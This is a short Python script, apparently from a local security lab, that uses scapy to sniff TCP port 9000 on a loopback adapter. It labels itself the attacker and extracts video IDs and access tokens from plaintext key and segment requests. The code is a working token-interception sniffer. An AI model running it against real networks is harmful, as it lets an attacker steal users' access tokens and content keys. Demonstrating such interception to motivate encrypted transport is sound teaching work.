from scapy.all import sniff, TCP, Raw
import re

def process_packet(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    payload = pkt[Raw].load
    try:
        text = payload.decode('utf-8', errors='ignore')
    except:
        return

    m_key = re.search(r"GET /get_key/([^?]+)\?token=([^\s]+)", text)
    if m_key:
        video_id, token = m_key.groups()
        print(f"[Attacker] Key request for video '{video_id}', token='{token}'")

    m_seg = re.search(r"GET /segment/([^\s]+)", text)
    if m_seg:
        segfile = m_seg.group(1)
        print(f"[Attacker] Segment request: {segfile}")

def main():
    iface_name = "Npcap Loopback Adapter"  # 👈 Tên alias, không phải Device\NPF...
    print(f"[Attacker] Bắt đầu sniffer (L3) trên {iface_name} (port TCP 9000)...")

    sniff(
        filter="tcp port 9000",
        iface=iface_name,
        prn=process_packet,
        store=False
    )

if __name__ == '__main__':
    main()
